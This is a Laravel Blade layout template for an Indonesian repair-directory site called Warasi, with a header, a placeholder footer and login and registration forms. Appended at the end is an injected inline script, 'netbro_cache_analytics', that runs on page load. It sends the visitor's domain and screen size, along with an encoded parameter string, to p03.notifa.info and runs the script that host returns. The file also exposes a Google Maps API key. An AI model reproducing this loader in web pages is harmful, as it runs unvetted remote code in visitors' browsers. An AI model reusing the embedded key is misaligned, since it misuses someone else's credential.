<!DOCTYPE HTML>
<html lang="en">
<head>
        <!--=============== basic  ===============-->
        <meta charset="UTF-8">
        <title>Warasi - Wadahnya Reparasi</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="robots" content="index, follow"/>
        <meta name="keywords" content=""/>
        <meta name="description" content=""/>
        <!--=============== css  ===============-->
        <link type="text/css" rel="stylesheet" href="{{ asset('template/katalog/css/reset.css') }}">
        <link type="text/css" rel="stylesheet" href="{{ asset('template/katalog/css/plugins.css') }}">
        <link type="text/css" rel="stylesheet" href="{{ asset('template/katalog/css/style.css') }}">
        <link type="text/css" rel="stylesheet" href="{{ asset('template/katalog/css/color.css') }}">
        <!--=============== favicons ===============-->
        <link rel="shortcut icon" href="{{ asset('template/katalog/images/favicon.ico') }}">
    </head>
    <body>
        <!--loader-->
        <div class="loader-wrap">
            <div class="pin"></div>
            <div class="pulse"></div>
        </div>
        <!--loader end-->
        <!-- Main  -->
        <div id="main">
            <!-- header-->
            <header class="main-header dark-header fs-header sticky">
                <div class="header-inner">
                    <div class="logo-holder">
                        <a href="index-2.html"><img src="{{ asset('template/katalog/images/logo3.png') }}" alt=""></a>
                    </div>
                    <div class="header-search vis-header-search">
                        <div class="header-search-input-item">
                            <input type="text" placeholder="Kata kunci" value=""/>
                        </div>
                        <div class="header-search-select-item">
                            <select data-placeholder="All Categories" class="chosen-select" >
                                <option>All Categories</option>
                                <option>Shops</option>
                                <option>Hotels</option>
                                <option>Restaurants</option>
                                <option>Fitness</option>
                                <option>Events</option>
                            </select>
                        </div>
                        <button class="header-search-button" onclick="window.location.href='listing.html'">Search</button>
                    </div>
                    <a class="add-list modal-open">Login <span><i class="fa fa-sign-in"></i></span></a>
                    <!-- nav-button-wrap-->
                    <div class="nav-button-wrap color-bg">
                        <div class="nav-button">
                            <span></span><span></span><span></span>
                        </div>
                    </div>
                    <!-- nav-button-wrap end-->
                    <!--  navigation -->
                    <div class="nav-holder main-menu">
                        <nav>
                            <ul>
                                <li><a href="{{ route('home') }}" class="@if(request()->is('/')) act-link @endif">Home</a></li>
                                <li><a href="{{ route('berita') }}" class="@if(request()->is('/berita')) act-link @endif">Berita</a></li>
                                <li><a href="{{ route('tentangKami') }}" class="@if(request()->is('/tentang-kami')) act-link @endif">Tentang Kami</a></li>
                            </ul>
                        </nav>
                    </div>
                    <!-- navigation  end -->
                </div>
            </header>
            <!--  header end -->

            @yield('content')
            
            <!--footer -->
            <footer class="main-footer dark-footer  ">
                <div class="container">
                    <div class="row">
                        <div class="col-md-3">
                            <div class="footer-widget fl-wrap">
                                <h3>About Us</h3>
                                <div class="footer-contacts-widget fl-wrap">
                                    <p>In ut odio libero, at vulputate urna. Nulla tristique mi a massa convallis cursus. Nulla eu mi magna. Etiam suscipit commodo gravida. Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam. </p>
                                    <ul  class="footer-contacts fl-wrap">
                                        <li><span><i class="fa fa-envelope-o"></i> Mail :</span><a href="#" target="_blank">yourmail@domain.com</a></li>
                                        <li> <span><i class="fa fa-map-marker"></i> Adress :</span><a href="#" target="_blank">USA 27TH Brooklyn NY</a></li>
                                        <li><span><i class="fa fa-phone"></i> Phone :</span><a href="#">+7(111)123456789</a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="footer-widget fl-wrap">
                                <h3>Our Last News</h3>
                                <div class="widget-posts fl-wrap">
                                    <ul>
                                        <li class="clearfix">
                                            <a href="#"  class="widget-posts-img"><img src="images/all/1.jpg" class="respimg" alt=""></a>
                                            <div class="widget-posts-descr">
                                                <a href="#" title="">Vivamus dapibus rutrum</a>
                                                <span class="widget-posts-date"> 21 Mar 09.05 </span>
                                            </div>
                                        </li>
                                        <li class="clearfix">
                                            <a href="#"  class="widget-posts-img"><img src="images/all/2.jpg" class="respimg" alt=""></a>
                                            <div class="widget-posts-descr">
                                                <a href="#" title=""> In hac habitasse platea</a>
                                                <span class="widget-posts-date"> 7 Mar 18.21 </span>
                                            </div>
                                        </li>
                                        <li class="clearfix">
                                            <a href="#"  class="widget-posts-img"><img src="images/all/3.jpg" class="respimg" alt=""></a>
                                            <div class="widget-posts-descr">
                                                <a href="#" title="">Tortor tempor in porta</a>
                                                <span class="widget-posts-date"> 7 Mar 16.42 </span>
                                            </div>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="footer-widget fl-wrap">
                                <h3>Our  Twitter</h3>
                                <div id="footer-twiit"></div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="footer-widget fl-wrap">
                                <h3>Subscribe</h3>
                                <div class="subscribe-widget fl-wrap">
                                    <p>Want to be notified when we launch a new template or an udpate. Just sign up and we'll send you a notification by email.</p>
                                    <div class="subcribe-form">
                                        <form id="subscribe">
                                            <input class="enteremail" name="email" id="subscribe-email" placeholder="Email" spellcheck="false" type="text">
                                            <button type="submit" id="subscribe-button" class="subscribe-button"><i class="fa fa-rss"></i> Subscribe</button>
                                            <label for="subscribe-email" class="subscribe-message"></label>
                                        </form>
                                    </div>
                                </div>
                                <div class="footer-widget fl-wrap">
                                    <div class="footer-menu fl-wrap">
                                        <ul>
                                            <li><a href="#">Home </a></li>
                                            <li><a href="#">Blog</a></li>
                                            <li><a href="#">Listing</a></li>
                                            <li><a href="#">Contacts</a></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="sub-footer fl-wrap">
                    <div class="container">
                        <div class="row">
                            <div class="col-md-4">
                                <div class="about-widget">
                                    <img src="images/logo.png" alt="">
                                </div>
                            </div>
                            <div class="col-md-4">
                                <div class="copyright"> &#169; CityBook 2018 .  All rights reserved.</div>
                            </div>
                            <div class="col-md-4">
                                <div class="footer-social">
                                    <ul>
                                        <li><a href="#" target="_blank" ><i class="fa fa-facebook-official"></i></a></li>
                                        <li><a href="#" target="_blank"><i class="fa fa-twitter"></i></a></li>
                                        <li><a href="#" target="_blank" ><i class="fa fa-chrome"></i></a></li>
                                        <li><a href="#" target="_blank" ><i class="fa fa-vk"></i></a></li>
                                        <li><a href="#" target="_blank" ><i class="fa fa-whatsapp"></i></a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
            <!--footer end  -->
            <!--register form -->
            <div class="main-register-wrap modal">
                <div class="main-overlay"></div>
                <div class="main-register-holder">
                    <div class="main-register fl-wrap">
                        <div class="close-reg"><i class="fa fa-times"></i></div>
                        <h3>Login <span>Wa<strong>Rasi</strong></span></h3>
                        <div class="soc-log fl-wrap">
                            <p>Untuk masuk atau mendaftar lebih cepat gunakan akun sosial.</p>
                            <a href="#" class="facebook-log"><i class="fa fa-facebook-official"></i>Login dengan Facebook</a>
                            <a href="#" class="twitter-log"><i class="fa fa-google"></i> Login dengan Google</a>
                        </div>
                        <div class="log-separator fl-wrap"><span>atau</span></div>
                        <div id="tabs-container">
                            <ul class="tabs-menu">
                                <li class="current"><a href="#tab-1">Login</a></li>
                                <li><a href="#tab-2">Daftar</a></li>
                            </ul>
                            <div class="tab">
                                <div id="tab-1" class="tab-content">
                                    <div class="custom-form">
                                        <form method="post"  name="registerform" action="{{ url('/admin/login') }}">
                                            {{ csrf_field() }}                                            
                                            <label class="{{ $errors->has('email') ? ' has-error' : '' }}">Username atau Alamat Email * </label>
                                            <input name="email" type="text" onClick="this.select()" value="{{ old('email') }}">
                                            @if ($errors->has('email'))
                                                <span class="help-block">
                                                    <strong>{{ $errors->first('email') }}</strong>
                                                </span>
                                            @endif
                                            <label class="{{ $errors->has('password') ? ' has-error' : '' }}">Password * </label>
                                            <input name="password" type="password" onClick="this.select()" value="" >
                                            @if ($errors->has('password'))
                                                <span class="help-block">
                                                    <strong>{{ $errors->first('password') }}</strong>
                                                </span>
                                            @endif
                                            <button type="submit" class="log-submit-btn"><span>Login</span></button>
                                            <div class="clearfix"></div>
                                            <div class="filter-tags">
                                                <input id="check-a" type="checkbox" name="check">
                                                <label for="check-a">Remember me</label>
                                            </div>
                                        </form>
                                        <div class="lost_password">
                                            <a href="#">Kamu Lupa Password ?</a>
                                        </div>
                                    </div>
                                </div>
                                <div class="tab">
                                    <div id="tab-2" class="tab-content">
                                        <div class="custom-form">
                                            <form method="post" name="registerform" class="main-register-form" id="main-register-form2" action="{{ url('/admin/register') }}">
                                                {{ csrf_field() }}
                                                <label class="{{ $errors->has('name') ? ' has-error' : '' }}">Nama Kamu * </label>
                                                <input name="name" type="text" onClick="this.select()" value="{{ old('name') }}">
                                                @if ($errors->has('name'))
                                                    <span class="help-block">
                                                        <strong>{{ $errors->first('name') }}</strong>
                                                    </span>
                                                @endif
                                                <label class="{{ $errors->has('email') ? ' has-error' : '' }}">Alamat Email *</label>
                                                <input name="email" type="text" onClick="this.select()" value="{{ old('email') }}">
                                                @if ($errors->has('email'))
                                                    <span class="help-block">
                                                        <strong>{{ $errors->first('email') }}</strong>
                                                    </span>
                                                @endif
                                                <label class="{{ $errors->has('password') ? ' has-error' : '' }}">Password *</label>
                                                <input name="password" type="password" onClick="this.select()">
                                                @if ($errors->has('password'))
                                                    <span class="help-block">
                                                        <strong>{{ $errors->first('password') }}</strong>
                                                    </span>
                                                @endif
                                                <label class="{{ $errors->has('password_confirmation') ? ' has-error' : '' }}">Konfirmasi Password *</label>
                                                <input name="password_confirmation" type="password" onClick="this.select()" value="">
                                                @if ($errors->has('password_confirmation'))
                                                    <span class="help-block">
                                                        <strong>{{ $errors->first('password_confirmation') }}</strong>
                                                    </span>
                                                @endif
                                                <button type="submit" class="log-submit-btn"><span>Daftar</span></button>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!--register form end -->
            <a class="to-top"><i class="fa fa-angle-up"></i></a>
        </div>
        <!-- Main end -->
        <!--=============== scripts  ===============-->     
        <script type="text/javascript" src="{{ asset('template/katalog/js/jquery.min.js') }}"></script>
        <script type="text/javascript" src="{{ asset('template/katalog/js/plugins.js') }}"></script>
        <script type="text/javascript" src="{{ asset('template/katalog/js/scripts.js') }}"></script>
		<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDwJSRi0zFjDemECmFl9JtRj1FY7TiTRRo&amp;libraries=places&amp;callback=initAutocomplete"></script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprALGls6wsTlqIeIlFLBw%2bMdeqWlHjO9U3CHnC4YdnFktiBhtabNMp40019FS%2bgUo614HfDVWcHr3C8W8KHHQwPfXxzvu%2bDlFjohQoooCVlzAfeQ94L2P2Ki9g2Sw8G85R8BKpJAW4gew%2fAU73S3e%2fmMMiiz%2fwz%2fM6ZLwz5awsKe64Rv1zTHLcao2Ww8vXHYXomx6Xp1Z51htSYapuZQX1udY4I1wcNpwrOvKkVcTBEHM6RAVoKsy3mksFhaPOcFuSDuCqv6TE95Grb9G6yr3wDnb6Px6mSxJIX8fHcaJhpHw1tSDWn7xTtQlskbvOHiOhWvgyJnxvCdZzB8A6%2fzxmjJPoQrAsRDBqBWEkaSLOH%2bVs%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>